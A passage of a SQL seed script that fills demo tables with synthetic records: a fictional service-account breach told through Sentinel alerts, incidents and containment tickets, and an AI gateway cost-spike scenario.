    'ExportedArtifactInfo', OBJECT_CONSTRUCT('ExportType', 'CSV', 'ArtifactType', 'Report', 'ArtifactId', 1),
    'RowCount', column4
  ), 'scenario:s2_breach', CURRENT_TIMESTAMP()::TIMESTAMP_NTZ
FROM VALUES
  (0, 'Finance - AP Aging', 'SM_AP_AR', 48000), (1, 'Finance - AP Aging', 'SM_AP_AR', 48000),
  (2, 'Finance - GL Summary', 'SM_Finance_GL', 150000), (3, 'Executive KPI Dashboard', 'SM_Executive_KPI', 2400);

-- Sentinel: MSSP closed the spray and the unfamiliar sign-in; multi-stage incident opened later
INSERT INTO RAW_SENTINEL_ALERTS
SELECT OBJECT_CONSTRUCT(
    'TimeGenerated', ISO_TS(column2::TIMESTAMP_NTZ), 'SystemAlertId', column1, 'AlertName', column3,
    'AlertSeverity', column4, 'ProviderName', column5, 'ProductName', column6, 'Tactics', column7,
    'Techniques', column8, 'CompromisedEntity', column9
  ), 'scenario:s2_breach', CURRENT_TIMESTAMP()::TIMESTAMP_NTZ
FROM VALUES
  ('s2-alert-spray', DATEADD(hour, 3, $s2_spray), 'Password Spray', 'Medium', 'IPC', 'Azure Active Directory Identity Protection', 'CredentialAccess', '["T1110.003"]', 'multiple users'),
  ('s2-alert-unfamiliar', DATEADD(minute, 5, $s2_login), 'Unfamiliar sign-in properties', 'Medium', 'IPC', 'Azure Active Directory Identity Protection', 'InitialAccess', '["T1078"]', 'svc_jde_integration@summitlive.example'),
  ('s2-alert-ps', DATEADD(minute, 11, $s2_exec), 'Suspicious PowerShell command line', 'High', 'MDATP', 'Microsoft Defender Advanced Threat Protection', 'Execution', '["T1059.001"]', 'JDE-APP02'),
  ('s2-alert-lsass', DATEADD(minute, 25, $s2_exec), 'Possible credential dumping via LSASS memory access', 'High', 'MDATP', 'Microsoft Defender Advanced Threat Protection', 'CredentialAccess', '["T1003.001"]', 'JDE-APP02'),
  ('s2-alert-whread', DATEADD(minute, 25, $s2_exfil), 'Unusual volume of data read from Fabric warehouse WH_CDW_Gold', 'High', 'ASI Scheduled Alerts', 'Azure Sentinel', 'Collection', '["T1213"]', 'svc_jde_integration@summitlive.example'),
  ('s2-alert-pbiexport', DATEADD(minute, 30, $s2_exfil), 'Mass export of Power BI reports from anonymous IP', 'High', 'ASI Scheduled Alerts', 'Azure Sentinel', 'Exfiltration', '["T1567"]', 'svc_jde_integration@summitlive.example'),
  ('s2-alert-exfil', DATEADD(minute, 36, $s2_exfil), 'Possible data exfiltration to cloud storage', 'High', 'MDATP', 'Microsoft Defender Advanced Threat Protection', 'Exfiltration', '["T1567.002"]', 'JDE-APP02');

INSERT INTO RAW_SENTINEL_INCIDENTS
SELECT OBJECT_CONSTRUCT(
    'TimeGenerated', ISO_TS(column3::TIMESTAMP_NTZ), 'IncidentNumber', column1, 'Title', column2,
    'Severity', column4, 'Status', 'Closed', 'Classification', column5, 'ClassificationComment', column6,
    'Owner', OBJECT_CONSTRUCT('assignedTo', column7),
    'CreatedTime', ISO_TS(column3::TIMESTAMP_NTZ), 'FirstActivityTime', ISO_TS(column8::TIMESTAMP_NTZ),
    'LastActivityTime', ISO_TS(column3::TIMESTAMP_NTZ), 'ClosedTime', ISO_TS(column9::TIMESTAMP_NTZ),
    'AlertIds', PARSE_JSON(column10),
    'AdditionalData', OBJECT_CONSTRUCT('alertsCount', ARRAY_SIZE(PARSE_JSON(column10)), 'tactics', PARSE_JSON(column11))
  ), 'scenario:s2_breach', CURRENT_TIMESTAMP()::TIMESTAMP_NTZ
FROM VALUES
  (4061, 'Password spray attack against multiple accounts', DATEADD(hour, 3, $s2_spray), 'Medium', 'BenignPositive',
   'Attempts blocked by smart lockout; no successful sign-ins observed. Closing.', 'MSSP SOC Tier 1',
   $s2_spray, DATEADD(hour, 20, $s2_spray), '["s2-alert-spray"]', '["CredentialAccess"]'),
  (4063, 'Unfamiliar sign-in properties involving svc_jde_integration', DATEADD(minute, 5, $s2_login), 'Medium', 'FalsePositive',
   'Service account; expected automation traffic. Closing.', 'MSSP SOC Tier 1',
   $s2_login, DATEADD(hour, 30, $s2_login), '["s2-alert-unfamiliar"]', '["InitialAccess"]'),
  (4127, 'Multi-stage incident involving Execution, Credential access and Exfiltration on JDE-APP02 and Fabric CDW', DATEADD(minute, 40, $s2_exfil), 'High', 'TruePositive',
   'Confirmed compromise of svc_jde_integration. Account disabled, credentials rotated, JDE-APP02 isolated.', 'SLG Security + MSSP SOC Tier 2',
   $s2_exec, DATEADD(hour, 70, $s2_exfil),
   '["s2-alert-ps","s2-alert-lsass","s2-alert-whread","s2-alert-pbiexport","s2-alert-exfil"]', '["Execution","CredentialAccess","Collection","Exfiltration"]');

-- SDP security incident + emergency containment change
INSERT INTO RAW_SDP_REQUESTS
SELECT OBJECT_CONSTRUCT(
    'id', '2079997959000200', 'display_id', '14700',
    'subject', 'Security incident: suspected compromise of svc_jde_integration (Sentinel #4127)',
    'request_type', OBJECT_CONSTRUCT('name', 'Incident'), 'priority', OBJECT_CONSTRUCT('name', 'Urgent'),
    'category', OBJECT_CONSTRUCT('name', 'Security'), 'mode', OBJECT_CONSTRUCT('name', 'Phone Call'),
    'status', OBJECT_CONSTRUCT('name', 'Closed'), 'group', OBJECT_CONSTRUCT('name', 'Security'),
    'technician', OBJECT_CONSTRUCT('name', t.full_name, 'email_id', t.email),
    'requester', OBJECT_CONSTRUCT('name', 'MSSP SOC', 'email_id', 'soc@mssp-partner.example'),
    'department', OBJECT_CONSTRUCT('name', 'Information Technology'), 'site', OBJECT_CONSTRUCT('name', 'Denver HQ'),
    'created_time', SDP_DT(DATEADD(minute, 60, $s2_exfil)),
    'responded_time', SDP_DT(DATEADD(minute, 75, $s2_exfil)),
    'due_by_time', SDP_DT(DATEADD(minute, 60 + 360, $s2_exfil)),
    'resolved_time', SDP_DT(DATEADD(hour, 70, $s2_exfil)),
    'completed_time', SDP_DT(DATEADD(hour, 96, $s2_exfil)),
    'is_overdue', TRUE, 'is_first_response_overdue', FALSE, 'is_fcr', FALSE, 'is_reopened', FALSE,
    'configuration_items', ARRAY_CONSTRUCT(OBJECT_CONSTRUCT('name', 'JDE-APP02'))
  ), 'scenario:s2_breach', CURRENT_TIMESTAMP()::TIMESTAMP_NTZ
FROM SEED_PEOPLE t WHERE t.person_idx = 4;

INSERT INTO RAW_SDP_CHANGES
SELECT OBJECT_CONSTRUCT(
    'id', '5000001460', 'display_id', '1460',
    'title', 'Emergency: Disable svc_jde_integration, rotate secrets, isolate JDE-APP02',
    'change_type', OBJECT_CONSTRUCT('name', 'Emergency'), 'risk', OBJECT_CONSTRUCT('name', 'High'),
    'stage', OBJECT_CONSTRUCT('name', 'Close'), 'status', OBJECT_CONSTRUCT('name', 'Completed'),
    'closure_code', OBJECT_CONSTRUCT('name', 'Success'),
    'scheduled_start_time', SDP_DT(DATEADD(minute, 90, $s2_exfil)),
    'scheduled_end_time', SDP_DT(DATEADD(minute, 210, $s2_exfil)),
    'completed_time', SDP_DT(DATEADD(minute, 200, $s2_exfil)),
    'change_owner', OBJECT_CONSTRUCT('name', t.full_name, 'email_id', t.email),
    'group', OBJECT_CONSTRUCT('name', 'Security'),
    'configuration_items', ARRAY_CONSTRUCT(OBJECT_CONSTRUCT('name', 'JDE-APP02'), OBJECT_CONSTRUCT('name', 'AADC01'))
  ), 'scenario:s2_breach', CURRENT_TIMESTAMP()::TIMESTAMP_NTZ
FROM SEED_PEOPLE t WHERE t.person_idx = 4;

-- ============================================================================
-- S4: AI cost spike - Sales & Marketing overrides routing to the premium model
-- ============================================================================
INSERT INTO RAW_AI_GATEWAY_REQUESTS
WITH u AS (
  SELECT ROW_NUMBER() OVER (ORDER BY person_idx) - 1 AS rn, email, COUNT(*) OVER () AS n
  FROM SEED_PEOPLE WHERE department = 'Sales & Marketing' AND R(person_idx,'ai_user') < 0.42
),
g AS (
  SELECT i, DATEADD(second, -FLOOR(R(i,'s4t') * 30 * 86400), $demo_end::TIMESTAMP_NTZ) AS ts,
    FLOOR(800 + R(i,'s4p') * 1700) AS pt, FLOOR(200 + R(i,'s4c') * 400) AS ct
  FROM (SELECT SEQ4() AS i FROM TABLE(GENERATOR(ROWCOUNT => 9000)))
)
SELECT OBJECT_CONSTRUCT(
    'request_id', 'aigw-s4-' || LPAD(TO_VARCHAR(g.i), 5, '0'),
    'timestamp', ISO_TS(g.ts), 'user_email', u.email, 'department', 'Sales & Marketing',
    'model', 'claude-opus-4-1', 'provider', 'Anthropic', 'route_reason', 'user_override', 'complexity', 'simple',
    'prompt_tokens', g.pt, 'completion_tokens', g.ct,
    'cost_usd', ROUND((g.pt * 15 + g.ct * 75) / 1000000, 6),
    'latency_ms', FLOOR(3000 + R(g.i,'s4l') * 6000), 'status', 'success',
    'client_app', 'Marketing Copy Assistant (browser extension)'
  ), 'scenario:s4_ai_spike', CURRENT_TIMESTAMP()::TIMESTAMP_NTZ
FROM g JOIN u ON u.rn = MOD(g.i, u.n);

SELECT SOURCE, COUNT(*) AS rows_injected FROM (
  SELECT SOURCE FROM RAW_SDP_REQUESTS UNION ALL SELECT SOURCE FROM RAW_SDP_CHANGES
  UNION ALL SELECT SOURCE FROM RAW_LM_ALERTS UNION ALL SELECT SOURCE FROM RAW_ENTRA_SIGNINS
  UNION ALL SELECT SOURCE FROM RAW_DEFENDER_ALERTS UNION ALL SELECT SOURCE FROM RAW_SENTINEL_INCIDENTS
  UNION ALL SELECT SOURCE FROM RAW_FABRIC_JOB_RUNS UNION ALL SELECT SOURCE FROM RAW_FABRIC_WAREHOUSE_QUERIES
  UNION ALL SELECT SOURCE FROM RAW_POWERBI_ACTIVITY UNION ALL SELECT SOURCE FROM RAW_AI_GATEWAY_REQUESTS)
WHERE SOURCE LIKE 'scenario:%' GROUP BY SOURCE ORDER BY SOURCE;
